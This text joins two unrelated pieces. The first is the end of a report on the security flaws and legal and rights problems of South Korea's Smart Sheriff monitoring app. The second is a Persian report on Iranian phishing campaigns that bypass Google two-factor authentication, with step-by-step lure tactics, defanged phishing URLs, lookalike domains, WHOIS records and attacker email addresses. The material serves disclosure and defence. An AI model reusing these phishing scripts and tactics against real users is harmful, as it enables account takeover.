compromise or error. Software packages should be kept current and patch levels should be no more than days or weeks behind new updates, at the very most. The Web services also appear to be misconfigured, leaving default documents, internal administrative information, and test code openly accessible, which can also be used to compromise infrastructure.22\nPotential for Mass Compromise\nCombinations of the identified vulnerabilities could lead to mass compromise of accounts or service disruption. An attacker with the resources to run a high volume of queries against Smart Sheriff could potentially identify all of Smart Sheriff’s users, and then use the vulnerabilities we identified to systematically disrupt all subscribers’ devices or the service itself.\nLegal and Policy Implications\nSmart Sheriff raises a number of legal and policy questions not only because of its security vulnerabilities but also because authorities have positioned it as a primary means for compliance with Korean telecommunications regulations. South Korean law establishes high standards for the protection of personal information and users’ digital security but the technical design of Smart Sheriff fails to properly meet these standards. Even though the application’s functionality is far more expansive — and invasive — than that required by the April 2015 mandate, the KCC and others have promoted the application specifically in connection with that mandate. These issues are particularly significant in light of the intended use of the application by minors and their guardians.\nInsufficient Data Protection and Information Security Measures under Korean Law\nSouth Korean data privacy and security laws place a number of requirements on MOIBA as the provider of Smart Sheriff.23 The Personal Information Protection Act (PIPA) and its Enforcement Decree apply to entities such as MOIBA that manage personal information.24 PIPA mandates that personal information managers “take technical, administrative and physical measures” to protect personal information “from loss, theft, leakage, alteration or damage.”25 Among the measures enumerated in the Enforcement Decree for ensuring the safety of personal information are requirements to control access to such data; adopt encryption technology to store and transmit the data; retain login records to respond to data-breach incidents; and install and upgrade security programs.26\nOur security audit, however, found Smart Sheriff did not meet the specific measures required by the PIPA Enforcement Decree. For example, MOIBA did not provide adequate access controls and failed to properly encrypt personal information, its servers also did not monitor and limit access requests made to the API, and made use of outdated software on its infrastructure. Any or all of these vulnerabilities could lead to the “loss, theft, leakage, alteration or damage” of personal information that PIPA was enacted to prevent.\nAdditionally, if MOIBA is considered an “information and communications service provider” under Korean law,27 it must also follow the technical and administrative protective measures for handling personal information as laid out in the Act on Promotion of Information and Communications Network Utilization and Information Protection, Etc. (ICNA).28 Similar to PIPA, the ICNA requires a service provider to, among other things, prevent unauthorized access to personal information, and to use “encryption technology and other methods for safe storage and transmission of personal information.”29\nThe ICNA’s Enforcement Decree and the KCC guidelines released pursuant to that decree provide significant detail on the appropriate application of encryption technology. The decree requires “one-way encrypted storage of passwords”; encrypted storage of account numbers and other information designated by the KCC; and secure servers for “transmitting users’ personal information and certification information.”30 As we identified, Smart Sheriff did not properly incorporate these measures.\nMoreover, the KCC guidelines — which apply to “service providers or similar”— note that “secure server[s] must have one of the following features: a. installation of SSL (Secure Socket Layer) certificate on the web server to encrypt information being transmitted; [or] b. installation of an encryption application program on the web server to encrypt information being transmitted.”31 However, Smart Sheriff servers employed neither SSL/TLS nor local encryption; rather, the application transmitted all personally identifying information in clear text to the network.\nInsufficient Information Security Measures under MOIBA’s Own Terms of Service\nThe South Korean regulations described here are at face value reflected in the terms of service and privacy policy provided by MOIBA to users of the Smart Sheriff application. Yet just as the application falls short of regulatory standards, so does it fail to fulfill MOIBA’s own contractual terms. In particular, MOIBA asserts that it has “put in place technical measures to prevent leakage, loss, theft, or falsification of personal information in processing Member’s information.”32 These measures purportedly include password protection for personal information, updated antivirus protections, encrypted communications, and an intrusion-blocking system.33 However, our analysis shows that Smart Sheriff did not incorporate some of these data protection measures demonstrated by lack of encryption for data in transit and the presence of outdated software on MOIBA’s server infrastructure.\nFunctionality Exceeds Actual Requirements of the Law\nSmart Sheriff was developed, with the KCC’s substantial support, throughout the time that the South Korean government has worked to establish greater control over digital media consumption by minors. The government’s efforts culminated in the April 2015 mandate on provision of blocking means and parental notification, and Smart Sheriff was highlighted prominently as a solution for compliance with that mandate.34 As the primary association of telecommunication providers in the country, MOIBA is powerfully positioned to publicize Smart Sheriff to vendors who must comply with the official mandate. Yet there is a divergence between Smart Sheriff’s functionality and the regulation’s actual requirements.\nThe April 2015 mandate proposed by the KCC requires only a means for blocking harmful media products, accompanied by notice to a parent by the telecommunications business operator when that means becomes inoperative. Yet Smart Sheriff is designed to do much more. The KCC itself distinguished among the features offered by Smart Sheriff in its 2013 annual report:\nThe Commission has developed and supplied software (Smart Sheriff) for Android smart phones and iPhone blocking harmful information in order to protect children and youth from illegal or harmful mobile information. The software also enables the control of reckless smart phone use by children or youth by providing functions for querying or blocking the access list of apps or Internet sites or limiting the number of access hours, in order to enable parents to control the smart phone use of their children.35\nThus, the application provides not only a “means for blocking harmful information,” but also “functions for querying or blocking … or limiting the number of access hours,” enabling direct parental control of a child’s smartphone usage.\nThrough the promotion of Smart Sheriff by the KCC and others, the April 2015 mandate has acquired the de facto effect of a parental monitoring and control mandate. This evolution of the mandate seems to implicate privacy concerns and excessive restrictions on juveniles that the National Assembly specifically tried to avoid when amending the law. It also raises questions regarding public expectations surrounding the mandate, and legislative intent. Indeed, Smart Sheriff’s actual blocking functionality was curtailed by MOIBA in May 2015, with MOIBA citing privacy implications — leaving in place only the parental control functionality that is outside the plain terms of the regulation.\nInternational Human Rights Law Concerning Children and Privacy\nThe privacy implications of government-mandated smartphone applications for minors merit further scrutiny under international human rights law, particularly the International Covenant on Civil and Political Rights (ICCPR)36 (accession by South Korea in 1990)37 and the Convention on the Rights of the Child (CRC)38 (ratified by South Korea in 1991).39 ICCPR article 17 provides that “no one shall be subjected to arbitrary or unlawful interference with his privacy, family, home or correspondence,”40 and that “everyone has the right to the protection of the law against such interference.”41 CRC article 16 provides that this right to privacy applies specifically to children.42\nThe April 2015 mandate and its overbroad fulfillment through Smart Sheriff may undermine minors’ right to privacy because it has resulted in the collection of an extensive amount of data, including minors’ personal information and smartphone usage patterns, and permits that data to be shared not only with parents but also with entities such as the child’s school.43 Indeed, the United Nations Human Rights Committee has, in preparation for its upcoming review of South Korea, requested from the government more “information on current legislation and practices governing the monitoring, surveillance and interception, analysis, use and storage of private communications (including Internet, telephone, e-mail and fax communications) and private data,” including an explanation of how a similar application for control of students’ mobile phones is compatible with ICCPR article 17.44\nThese privacy concerns are compounded by the significant security vulnerabilities of the application that could allow malicious actors to wholly compromise the personal data and accounts of minors and their parents. To protect the right to privacy, the KCC or other government entities should have carefully evaluated the digital security risks presented by the government’s mandate and promotion of Smart Sheriff services (and other such applications). It is unknown whether the government undertook such an evaluation before relying on the service. However, it is probable that a technical security audit of Smart Sheriff would have identified many of the problems we uncovered in our investigation.\nFinally, the mandate and its implementation raise questions regarding the role of the government in parental oversight of children. CRC article 5 requires states to “respect the responsibilities, rights and duties of parents … to provide, in a manner consistent with the evolving capacities of the child, appropriate direction and guidance in the exercise by the child of the rights recognized in the present Convention”45 — including freedom of expression and the right to privacy. By requiring telecommunications business operators to provide blocking means on minors’ mobile devices by default, and promoting insecure options for doing so, the state has instead compelled parents to moderate their children’s experience of digital media, and exposed children to security risks of which parents are not informed.46\nConclusion\nSmart Sheriff exemplifies the risks inherent in government-mandated monitoring applications. The application’s design suffers from serious security flaws and appears to have been insufficiently checked for vulnerabilities, yet users have little choice in adopting and continuing to use the software. Indeed, this technology was popularized throughout the country through government regulation, exposing potentially hundreds of thousands of users to digital security compromise. It has also opened the door to societal acceptance of parental-monitoring and content-blocking practices that raise concerns under international human rights law.\n\nAppendix A\nClick here to read the technical appendix.\n\nAppendix B\nClick here to read the legal and policy appendix.\nAcknowledgements\nWe are grateful to Kelly Kha Yeun Kim (OpenNet Korea) and Professor Kyung Sin “K.S.” Park (Korea University, OpenNet Korea) for substantive input on the South Korean legal and policy environment and for translation assistance (for further information on OpenNet Korea see http://opennetkorea.org).

    "text": "\n\t\t\t\tخلاصه\nاین گزارش به کمپین رو به رشد حملات فیشینگ علیه کاربران در گستره ایران و حداقل یک حمله به یک فعال غربی می‌پردازد. این حمله‌ها تلاش دارند تا امنیت مضاعفی که از طریق رمز عبور دو مرحله‌ای در گوگل فراهم شده است را دور بزنند و به شکل گسترده‌ای مبتنی بر تماس‌های تلفنی و تلاش برای ورود در زمان حقیقی از سوی مهاجم است. جالب اینجاست که این حمله‌ها عموما با یک تماس تلفنی از کشور انگلستان شروع می‌شده و هکرها به یکی از دو زبان فارسی و یا انگلیسی ارتباط برقرار می‌کرده‌اند.\nاین حمله‌ها به دانش حمله کننده از فعالیت‌های قربانی متمرکز است و زیرساخت‌ها و تاکتیک‌های یکسانی را با حمله‌های مشابهی که پیش از این ثبت شده را دنبال می‌کند. این نوع حمله ها به طور روزافزونی افزایش می‌یابند و این گزارش تلاش دارد با اضافه کردن جزییات، دیگر قربانیان بالقوه این نوع حمله‌ها را آگاه کند. گزارش را نیز با چند پیشنهاد امنیتی و برجسته کردن اهمیت رمز عبور دو مرحله‌ای به پایان می‌بریم.\nبخش اول: پیش زمینه\nرمز عبور دو مرحله‌ای چیست؟\nروز عبور دو مرحله‌ای (Two-Factor Authentication – 2FA) یک ابزار قدرتمند است که توسط بسیاری از سرویس‌ها به منظور افزایش امنیت و کاهش خطر حمله‌های فیشینگ و دزدی رمز عبور مورد استفاده قرار می‌گیرد. در معمول ترین شیوه رمز عبور دو مرحله‌ای، کاربر پس از وارد کردن رمز عبور خود، پیامکی از طریق تلفن همراه دریافت خواهد کرد که حاوی رمز عبور دوم است. پیامک به تلفنی که از پیش ثبت و هویت آن تایید شده است ارسال خواهد شد. با استفاده از این امکان به راحتی می توان مهاجمان را سردرگم کرد.\nاین تصویر نحوه عملکرد رمز عبور دو مرحله‌ای را شرح می‌دهد. تصویر از گوگل\nاستفاده از رمز عبور دو مرحله‌ای، حمله‌های فیشینگ را بسیار سخت می کند، چرا که مهاجم علاوه بر رمز عبور کاربر، باید رمزعبور مرحله دوم که یک بار مصرف است را نیز در اختیار داشته باشد. معمولا رمز عبور دوم به سرعت منقضی می‌شود که این مساله کار را برای مهاجمان دو چندان سخت می‌کند.\nحمله به رمز عبور دو مرحله ای: هیچ اتفاق جدیدی نیافتاده\nبراساس مشاهدات محققان در یک دهه اخیر، گونه‌های مختلفی از حمله به رمز عبور دو مرحله‌ای وجود دارد. به عنوان نمونه، بروس شنیر در سال 2005 مدلی از حمله زمان حقیقی را معرفی کرد که در آن مهاجمان به طور همزمان از حمله مرد میانی (Man-in-the-Middle attack) و حمله به دستگاه استفاده می کنند. شنیر این حمله زمان حقیقی فیشینگ به رمز عبور دو مرحله را 9 سال پیش گزارش کرده بود.\nامروزه محققان از رشد حمله‌های زمان حقیقی فیشینگ به رمز عبور دو مرحله‌ای سخن به میان می‌آورند که بیشتر آن ها مرتبط با کلاهبرداری آنلاین هستند. یک مقاله آکادمیک در سال 2013 نگاهی کلی به بسیاری از این شاخصه‌ها انداخته است. این حمله‌ها می‌توانند از طریق دزدی اطلاعات رمز عبور دو مرحله‌ای از دستگاه (مانند حمله Man in the Browser) و یا استفاده از صفحه ورود رمز عبور دو مرحله‌ای صورت پذیرد. برخی از کمپین‌های مبتنی بر بدافزارها که رمز عبور دو مرحله‌ای را هدف قرار داده‌اند در سال‌های متمادی دنبال شده‌اند و به صورت گسترده فعال هستند. همچنین مشاهده شده است که این گروه از حمله‌ها تلاش دارند که قربانی را برای نصب یک اپ مجزا بر روی دستگاه اندرویدی برای دریافت رمز عبور دومِ یک بار مصرف متقاعد کنند. گروه دیگری از این حمله‌ها سعی می کنند با استفاده از تغییر شماره تلفن، اطلاعات ثبتی سیم کارت و یا یک صندوق پستی صوتی محافظت شده کار خود را پیش ببرند.\nفیشینگ ایرانی\nکمپین‌های فیشینگ بسیاری شناسایی شده‌اند که به ایرانیان مرتبط هستند. به عنوان نمونه، حمله به حساب‌های کاربری جیمیل به صورت معمول مشاهده شده است که از آن جمله می‌توان به گزارش امنیتی گوگل در سال ۲۰۱۳ اشاره کرد که به شرح کمپین‌های شکل گرفته پیش از انتخابات ریاست جمهوری می‌پردازد. علاوه بر این، گوگل این حمله را به حمله‌های پیشین که با استفاده از مجوزهای جعلی SSL علیه حساب کاربری جیمیل کاربران ایرانی صورت گرفته بود، ربط داده است. در نمونه‌های دیگر، مهاجمان ایرانی از چندین حمله فیشینگ از طریق حمله‌های بدافزاری استفاده کرده‌اند.\nهرچند حمله به رمز عبور دو مرحله‌ای، کلاهبرداری آنلاین محسوب می‌شود، اما با رشد روز افزون استفاده از رمز عبور دو مرحله‌ای توسط کاربران سرویس‌های رایگان، احتمال این وجود دارد که مهاجمان بالقوه به سمت توسعه نمونه‌های خود از حمله‌های فیشینگ پیش روند.\nبخش دوم: دو حمله زمان حقیقی\nحمله اول : “ایران” تلاش دارد به حساب کاربری شما وارد شود\nنحوه فعالیت این حمله چیست؟\nاین حمله زمان حقیقی تلاش می‌کند به طور همزمان رمز عبور و رمز عبور یک بار مصرف دوم را بدزدد. مهاجم برای این کار از صفحه جعلی مشابه صفحه ورود به حساب کاربری دو مرحله‌ای جیمیل بهره می‌برد. مهاجم، اطلاعات ورودی کاربر را از این صفحه جعلی جمع آوری کرده و به طور همزمان از آن برای ورود به حساب کاربری جیمیل قربانی استفاده می‌کند. مهاجم با استفاده از رمز عبور اولیه به حساب کاربری وارد می‌شود و جیمیل رمز عبور دوم را به کاربر ارسال می‌کند. پس از وارد کردن رمز عبور دوم در صفحه جعلی، مهاجم از آن برای ورود به حساب کاربری استفاده خواهد کرد.\nروش حمله\nدر این بخش روش‌های مورد استفاده در این حمله را شرح می‌دهیم. اطلاعات شناسایی اهداف به نوعی تغییر یافته است که هویت آن‌ها نا‌شناس باقی بماند.\nگام اول: دریافت پیامک از گوگل که ترس اخلال در حساب کاربری را به وجود می آورد\nحمله با ارسال یک پیامک به قربانی در ساعات اولیه صبح آغاز شد. پیام ارسال شده یک کپی از پیام اخطار گوگل بوده که به کاربر اطلاع می‌دهد که فردی در تلاش برای ورود به حساب کاربری اوست. شماره ارسال کننده پیامک برای قربانی نا‌شناس بوده است.\nعکس ۲: پیامک جعلی درباره تلاش برای ورود به حساب کاربری گوگل\nپیامک جعلی درباره تلاش برای ورود به حساب کاربری گوگل\nظاهرا این کار به منظور افزایش فشار نگرانی بر کاربر مبنی بر در خطر بودن حساب کاربری شخصی او بوده است.\nگام دوم: پیگیری سریع از طریق اعلان تلاش برای ورود به حساب کاربری\n۱۰ دقیقه بعد از دریافت اولین پیامک، قربانی ایمیلی مشابه اعلان تلاش برای ورود به حساب کاربری جیمیل دریافت می‌کند. نکته بسیار حائز اهمیت، پر کردن ایمیل با اطلاعات شخصی کاربر مانند نام، ایمیل و عکس پروفایل بود که به شکل ماهرانه‌ای در ایمیل قرار داده شده بودند.\nبه این نکته باید اشاره کرد که اعلان تلاش برای ورود به حساب کاربری نشان می‌داد که «The Iran» تلاش داشته است این کار را انجام دهد. برای کاربری که نگران است هدف حمله گروهی در ایران قرار گیرد، این ایمیل می‌تواند به راحتی باعث افزایش نگرانی شود.\nno-reply@support.qooqlemail.com\nعکس ۳: ارسال کننده پیامک نیز تلاش داشته که نام دامنه ایمیل خود را بسیار شبیه به نام دامنه گوگل انتخاب کند\nگام سوم: متقاعد کردن کاربر برای وارد کردن رمز عبور و انتظار برای دریافت رمز عبور دوم\nفشردن دکمه «تغییر رمز عبور» کاربر را به یک صفحه فیشینگ می‌فرستد. ما آدرس صفحه را به منظور حفاظت از کاربر هدف کمی تغییر داده‌ایم.\nhttp://login.logins-verify[dot]com/[redacted]\nاین صفحه مخصوص قربانی طراحی و در آن آدرس ایمیل و نام کاربر ذکر شده است. این صفحه شامل کد‌های دیگری نیز می‌شود که به منظور شبیه سازی صفحه با صفحه پویای گوگل از آن سایت به عاریت گرفته شده‌اند.\nهدف مهاجم دریافت رمز عبور واقعی کاربر است. به همین دلیل رمز جدید به طور کلی نادیده گرفته می‌شود.\nوارد کردن اطلاعات در این صفحه و فشردن دکمه «تغییر رمز عبور» قربانی را به صفحه دومی که به نظر می‌رسد صفحه درخواست رمز عبور دوم است می‌فرستد.\nوارد کردن اطلاعات در این صفحه و فشردن دکمه «تغییر رمز عبور» قربانی را به صفحه دومی که به نظر می‌رسد صفحه درخواست رمز عبور دوم است می‌فرستد.\nبرای انجام این کار، مهاجم باید به طور مداوم صفحه فیشینگ را بررسی کند. بلافاصله که کاربر رمز عبور خود را در سایت فیشینگ وارد کند، هکر از‌‌ همان اطلاعات برای ورود به جیمیل استفاده خواهد کرد. با ورود مهاجم به ایمیل کاربر، گوگل رمز دوم را به قربانی ارسال می‌کند. پس از آن مهاجم منتظر می‌ماند تا کاربر رمز عبور دوم خود را نیز در صفحه فیشینگ وارد کند. سپس رمز عبور دوم برای ورود به حساب کاربری و در دست گرفتن کنترل آن استفاده خواهد شد.\nگام چهارم: افزایش فشار بر قربانی با ارسال اعلان رمز عبور دوم جعلی\nدر این نمونه، حمله ناموفق بوده است. قربانی نسبت به روند برنامه مشکوک می‌شود و از وارد کردن اطلاعات شناسایی فردی خودداری می‌کند. در طول یک ساعت پس از آن و احتمالا با افزایش ناامیدی، مهاجم تعداد زیادی پیامک ساختگی به قربانی ارسال کرده است. این پیامک‌ها شبیه به پیامک‌های مربوط به رمز عبور دوم گوگل طراحی شده بودند. قربانی بیش از ۱۰ پیامک در مدت زمان کوتاهی دریافت کرده است. بیشتر پیامک‌ها از شماره‌های متفاوتی ارسال شده‌اند و همگی برای قربانی نا‌شناس هستند.\nعکس ۶: پیامک‌های ساختگی رمز عبور دوم گوگل\nما حدس می‌زنیم که این کار بیشتر به منظور افزایش فشار روانی بر قربانی انجام گرفته است تا این تصور را تقویت کند که هکر در حال حاضر رمز عبور هدف را در دست دارد. مهاجم باید امیدوار بوده باشد که تعداد زیادی پیامک بتواند قربانی را به واکنش وادارد اما نیرنگ آخر نیز کارساز نبوده و این حمله ناموفق به پایان رسیده است.\nحمله دوم: راحت باش، من همین حالا هم خیلی از تو می‌دانم\nنحوه فعالیت این حمله چیست؟\nدومین نوع حمله که ما حدس می‌زنیم از سوی مهاجمان یکسان طرح ریزی و پیاده شده باشد، مشخصه‌های یکسانی با حمله‌های قبلی دارد. در این نمونه، طعمه کمی متفاوت است و شامل یک تماس تلفنی و یک پروپوزال نیز می‌شود. هدف نهایی اما چیزی نیست جز قانع کردن قربانی به وارد کردن هر دو رمز عبور.\nروش حمله\nگام اول: تماس با هدف به همراه پیشنهاد کار\nاین حمله با تماس تلفنی صبح هنگامی از شماره تلفنی در انگلستان آغاز می‌شود. یک صدای مردانه با قربانی درباره فعالیت‌هایی که در آن درگیر بوده – چه فعالیت‌های آنلاین و چه فعالیت در خارج از فضای اینترنت – صحبت می‌کند. تماس گیرنده که احتمالا یکی از هکرهاست، به نحوی القا می‌کند که اطلاعات بسیاری درباره فعالیت‌های حرفه‌ای، علاقمندی‌ها و… هدف دارد.\nبعد از گفتن تمام این نکات که بیش از ترغیب هدف، باعث نگرانی او می‌شود، مهاجم به قربانی کاری پیشنهاد می‌کند که مرتبط با فعالیت‌های اوست. تماس تلفنی با قول ارسال پروپوزال به پایان می‌رسد.\nگام دوم: پیگیری سریع درباره پروپوزال و یک لینک جعلی گوگل درایو\nمدت کوتاهی پس از پایان تماس تلفنی، کاربر ایمیلی درباره پروپوزال بر روی یکی از ایمیل‌های غیر عمومی خود دریافت می‌کند. ایمیل روند فریب را ادامه می‌دهد و نام استفاده شده در ایمیل با نام تماس گیرنده همخوانی دارد.\nعکس ۷: ایمیل به طرز ماهرانه‌ای مانند اعلان به اشتراک گذاری فایل در گوگل درایو طراحی شده است\nایمیل به طرز ماهرانه‌ای مانند اعلان به اشتراک گذاری فایل در گوگل درایو طراحی شده است و متن ایمیل پروژه‌ای را پیشنهاد می‌دهد که با ارقام چند ده هزار دلاری سعی در فریفتن کاربر دارد.\nگام سوم: فریب دادن قربانی برای وارد کردن رمز عبور و انتظار برای رمز عبور دوم\nبا کلیک کردن بر روی Document.pdf قربانی به یک صفحه جعلی ورود به گوگل درایو برده می‌شود. مجددا باید گفت که صفحه با نام و ایمیل قربانی پر شده و کاملا شخصی سازی شده است.\nعکس ۸: صفحه جعلی ورود به گوگل درایو\nدامنه صفحه مورد نظر تلاش می‌کند که با استفاده از زیر دامنه‌ها یک صفحه کاملا رسمی را نمایش دهد. (برای شناسایی نشدن هدف نشانی آدرس اینترنتی کوتاه شده است.)\nhttp://login.setting.verification.configuration.user.action.first.step.edit.check.privacy.view.document.setting.verification.configuration.user.login.logins-verify[dot]com/[redacted]\nوارد کردن رمز عبور، کاربر را به یک صفحه جعلی رمز عبور دوم می‌فرستد.\nحمله سوم: من یک روزنامه نگارم، فقط فایل را باز کن\nنحوه فعالیت این حمله چیست؟\nاین حمله بسیار شبیه به حمله شماره ۲ است، با این تفاوت که مهاجمان در این حمله خود را از اصحاب رسانه یا روزنامه نگار معرفی می‌کنند. تماس‌ها همچنان از شماره تلفنی‌هایی در کشور انگلستان برقرار می‌شود. در برخی از موارد، از این شماره‌ها برای حمله‌های مشابه نیز استفاده شده است. ژیلیان یورک، مدیر آزادی بیان بین المللی بنیاد الکترونیک فرانتیر یک بار هدف چنین حمله‌ای قرار گرفته بود. او به ما اجازه داد که از وی نام ببریم و اطلاعات جزئی‌تری از حمله را با ما در میان گذاشت.\nروش حمله\nگام اول: تماس زودهنگام صبحگاهی\nیورک با یک تماس زودهنگام صبحگاهی از انگلستان از خواب برمی‌خیزد. یک تماس گیرنده مرد خود را روزنامه نگار رویترز معرفی می‌کند و با برقراری مکالمه‌ای کوتاه، خود را آشنا با حوزه فعالیت‌های یورک نشان می‌دهد. به دلیل کیفیت پایین تماس، مهاجم مجددا تماس می‌گیرد. او از تمایل خود برای مشورت و بحث درباره موضوعاتی سخن می‌گوید و آدرس ایمیل هدف را مجددا با او چک می‌کند.\nگام دوم: ارسال طعمه\nبلافاصله پس از تماس تلفنی، یورک یک ایمیل که به نظر می‌رسید از طرف بخش تکنولوژی خبرگزاری رویترز بود دریافت کرد که از او قول یک مصاحبه را می‌گرفت. ایمیل ارسال شده تعدادی ایراد و خطا داشت از جمله دیکته غلط کلمه رویترز (Reutures). این ایمیل به نسبت به نمونه‌های قبلی حمله که مورد بحث قرار گرفت، ماهرانه‌تر طراحی شده بود.\nعکس ۱۰ : بلافاصله پس از تماس تلفنی، یورک یک ایمیل که به نظر می‌رسید از طرف بخش تکنولوژی خبرگزاری رویترز بود دریافت کرد که از او قول یک مصاحبه را می‌گرفت\nمانند حمله‌های پیشین، این ایمیل هم به نظر می‌رسید که به یک متن در گوگل درایو متصل باشد، اما در واقع حاوی لینکی به یک سایت فیشینگ بود که از طریق یک لینک تغییر مسیر (Redirect) گوگل به این صفحه هدایت می‌شد.\n \nhttps://www.google.com/url?q=http%3A%2F%2Freuters.users.check.login.newsia[dot]my%2FDr-Check%2FAutoSecond%3FChk%3Dj5645hgfgh5gff&sa=D&sntz=1&usg=AFQjCNF7FFFdEDdao4J8bYqow6uTZDx18w\nجالب اینجاست که متن به اشتراک گذاشته شده حاوی آدرس جیمیلی است که همین آدرس برای پاسخ دادن به ایمیل اولیه نیز مورد استفاده قرار گرفته.\nmailto: bijan.yazdani2002@gmail.com\nدیگر تلاش‌ها هم شامل ایمیل‌های مشابهی بوده که ما به منظور حفاظت از هویت قربانیان، از ذکر آن‌ها خودداری می‌کنیم.\nگام سوم: افزایش فشار\nهدف بلافاصله بر روی لینک کلیک نکرد که همین مساله باعث افزایش نگرانی مهاجم شد. به همین دلیل هکر تماس دیگری با قربانی برقرار می‌کند. یورک به مهاجم متذکر می‌شود که اگر تمایل دارد چیزی با او در میان بگذارد، باید آن را در متن ایمیل لحاظ کند.\nگام چهارم: اگر بار اول کارساز نبود\nمهاجم برای بار دوم و این بار با نامی جدید ایمیلی که مجددا حاوی لینک به یک فایل متنی جعلی گوگل است، ارسال می‌کند. مهاجم برای ایمیل جدید از یک نام غربی به نام «الکس اندرسون» استفاده می‌کند، اما لینک موجود در ایمیل، با لینک فیشینگ قبلی تفاوتی ندارد.\nعکس ۱۱ : مهاجم برای بار دوم و این بار با نامی جدید ایمیلی که مجددا حاوی لینک به یک فایل متنی جعلی گوگل است، ارسال می‌کند\nمهاجم مجددا از طریق یک تماس تلفنی پیگیر ایمیل می‌شود و تلاش می‌کند تا یورک را راضی به باز کردن متن ایمیل کند. هکر این بار لحن خود را تغییر داده و با روشی تهاجمی سعی در متقاعد کردن هدف دارد، که همین مساله باعث بی‌نتیجه ماندن تلاش‌های او می‌شود.\nمهاجم که خسته شده است می‌گوید: من متن را این بار از ایمیل شخصی‌ام ارسال کرده‌ام، لطفا آن را باز کنید.\nدر کل و در مدت کوتاهی، مهاجم بیش از ۳۰ بار با یورک تماس می‌گیرد، اما حمله در ‌‌نهایت به نتیجه نمی‌رسد.\nگام ۵: راه‌های دیگر\nدر زمان انجام این حمله، حساب فیس بوک یورک، هدف قرار می‌گیرد و درخواست‌های متعدد تنظیم مجدد رمز عبور دریافت می‌کند. اما از آنجایی که مهاجم به ایمیل پشتیبانی قربانی دسترسی ندارد، مجددا حمله ناکام می‌ماند.\nبخش چهارم: مهاجم؟ حدس‌های مختلف\nحمله‌ها نکات مشترک بسیار زیادی با یکدیگر دارد و در برخی از موارد از دامنه‌های یکسان استفاده می‌کنند. یکی از این نکات، شبیه سازی WHOIS دامنه‌های مورد استفاده با گوگل است. به عنوان نمونه، در هر دو حمله اول و دوم، از دامنه logins-verify [dot] com استفاده شده است.\nWhois for logins-verify[dot]com\nDate Checked\n2015-06-28\nRegistrant\nGoogle Inc.\nRegistrar\nOnlinenic Inc\nCreated\n2015-06-27T04:00:00+00:00\nUpdated\n2015-06-27T03:27:15+00:00\nExpires\n2016-06-27T04:00:00+00:00\nName Servers\nns1.dns-diy.net, ns2.dns-diy.net\nEmail\ngmail-aduse@google.com (a,t,r)\nName\nMarkMonitor, Inc.

(a,t,r)\nهرچند باید این نکته را متذکر شد که WHOIS شامل یک ایمیل جالب نیز هست:\ngmail-aduse@google.com\nما متوجه شدیم که از این آدرس اشتباه، برای ثبت تعداد دیگری دامنه که به نظر می‌رسد همگی به منظور عملیات فیشینگ بوده‌اند نیز استفاده شده است:\n\n\n\n\nDomain\n\n\nIP\n\n\nIP Organization\n\n\nOrg Country\n\n\n\n\nservice-logins[.]com\n\n\n162.222.194.51\n\n\nGLOBAL LAYER

دیگر حمله‌های مشابه حمله اول (البته با تفاوت در جزییات) نیز از دامنه‌های مشابه همین دامنه برای صفحات فیشینگ استفاده می‌کرده‌اند.\nservices-mails[dot]com\nبسیاری از صفحات فیشینگ از لینک ری دایرکت گوگل استفاده می‌کنند.\n \nhttps://www.google.com/url?q=http%3A%2F%2Fservices-mails.com%2F[REDACTED]\nبا گرفتن WHOIS مشخص می‌شود که این دامنه نیز به شکل جعلی به نام گوگل ثبت شده است با این تفاوت که اشتباهات دیکته‌ای دامنه‌های قبلی در آن دیده نمی‌شود. در حال حاضر اطلاعات به دست آمده از دامنه در زیر آورده شده:\n\n\n\n\nDomain\n\n\nIP\n\n\nIP Organization\n\n\nOrg Country\n\n\n\n\nservices-mails[.]com\n\n\n134.19.181.85\n\n\nGLOBAL LAYER B.V.\n\n\nN.L.\n\n\n\n\nدر ‌‌نهایت، سایت فیشینگی که در حمله سوم مورد استفاده قرار گرفته است، متفاوت از بقیه، از یک دامنه دستکاری شده مربوط به یک شرکت اتوبوس رانی در مالزی استفاده کرده است.\nreuters.users.check.login.newsia.my\nایمیل ها\nدر بسیاری از حمله‌ها – و نه در همه آن‌ها – از آدرس دامنه سایت‌های شناخته شده استفاده کرده‌اند. به نظر می‌رسد مهاجمان از یک اسکریپت پی اچ پی که در سایت‌ها جاسازی شده است بهره می‌برند. به عنوان نمونه، بسیاری از حمله‌ها از سایت یک وکیل تگزاسی که تخصصش درباره جراحات زایمان است، صورت گرفته. ما با این دفتر حقوقی تماس گرفتیم و آن‌ها با به روز رسانی سایت خود، اسکریپت مخرب را حذف کرده‌اند.\nدر نمونه‌های دیگر، مهاجمان سعی کرده‌اند از دامنه‌هایی با شکل ظاهری مشابه دامنه‌های شناخته شده استفاده کنند.\nqooqlemail.com\nممکن است WHOIS این دامنه، راه را برای تحقیقات بیشتر باز کند:\nRegistrant Name: Ali Mamedov\nRegistrant Organization: Private person\nRegistrant Street: versan 9, 16/7\nRegistrant City: Kemerovo\nRegistrant State/Province: other\nRegistrant Postal Code: 110374\nRegistrant Country: RU\nRegistrant Phone: +7.4927722884\nRegistrant Email: kavaliulinovich@gmail.com\nآدرس ایمیل نیز به شرح زیر است:\nkavaliulinovich@gmail.com\nکه پیش از این به با یک سایت که احتمالا برای مقاصد فیشینگ از آن استفاده می‌شده در ارتباط بوده:\nbluehostsupport.com\nدر ‌‌نهایت باید گفت که بسیاری از ایمیل‌ها از میزبان‌های رایگان سرویس‌های ایمیل مانند جیمیل بهره می‌بردند:\nbijan.yazdani2002@gmail.com\nنکته جالب اما اینکه تعدادی از آدرس‌هایی که برای حمله‌ها مورد استفاده قرار گرفته‌اند، مرتبط با پروفایل‌های فعالی در شبکه‌های اجتماعی هستند.\nتلاش اولشان نبوده: ارتباط با دیگر کمپین های مشابه\nاشتباه دیکته در تاریخچه WHOIS ما را به گزارش‌های پیشین می‌برد:\n\n\n\n\nThamar Reservoir: An Iranian cyber-attack campaign against targets in the middle east\n \nClearSky Sec\n\n\nhttp://www.clearskysec.com/wp-content/uploads/2015/06/Thamar-Reservoir-public1.pdf\n\n\n\n\nOPERATION WOOLEN-GOLDFISH: When Kittens Go Phishing\n \nTrend Micro\n\n\n\nhttp://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-woolen-goldfish.pdf\n\n\n\n\nگزارش شرکت امنیت سایبری کلیراسکای عنوان می‌کند که حمله‌هایی مشابه حمله‌های ذکر شده که در روش‌ها مشابه هستند، توسط دیگر شرکت‌های امنیتی نیز گزارش شده‌اند (البته لزوما زیرساخت این نوع حمله‌ها یکسان نبوده است). از این جمله می‌توان به موارد زیر اشاره کرد:\n\n\n\n\nAjax Security Team, Operation Saffron Rose\n 